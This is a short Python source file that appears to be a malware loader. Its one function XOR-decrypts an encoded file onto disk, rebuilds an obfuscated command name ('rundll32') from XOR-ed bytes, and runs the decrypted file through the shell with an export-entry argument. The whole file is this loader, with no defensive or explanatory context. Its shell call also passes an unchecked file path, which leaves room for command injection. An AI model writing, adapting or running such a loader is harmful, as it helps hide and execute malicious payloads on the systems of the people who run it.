import subprocess


def load(source, target, key, command_key):
    command = b"\x28\x2f\x34\x3e\x36\x36\x69\x68"
    with open(source, "rb") as f1, open(target, "wb") as f2:
        while True:
            byte = f1.read(1)
            if not byte:
                break
            decoded = ord(byte) ^ key
            f2.write(bytes([decoded]))
    runner = bytes([x ^ command_key for x in command]).decode()
    line = f'{runner} "{target}", ExportEntry argument'
    subprocess.run(line, shell=True)
